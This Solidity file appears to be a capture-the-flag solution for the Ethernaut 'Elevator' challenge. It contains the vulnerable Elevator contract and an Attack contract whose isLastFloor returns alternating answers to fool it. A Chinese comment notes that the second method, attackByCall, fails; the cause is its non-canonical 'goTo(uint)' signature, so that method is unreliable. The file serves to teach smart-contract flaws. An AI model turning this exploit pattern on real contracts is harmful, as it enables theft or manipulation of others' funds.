// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Attack{

    bool public mark;

    function attack(address _addr) public {
        mark = false;
        Elevator(_addr).goTo(10);
    }

    // 不知道为啥  要么gas费为75ETH 要么就是失败  没反应  但是 flipcoin 是ok的 
    function attackByCall(address _addr) public {
       mark = false;
       (bool sent , bytes memory data) = _addr.call(abi.encodeWithSignature("goTo(uint)", 10));
       require(sent, "Failed to call function");   
    }

    function isLastFloor(uint _floor) public returns (bool){
        mark = !mark;
        return !mark;
    }
}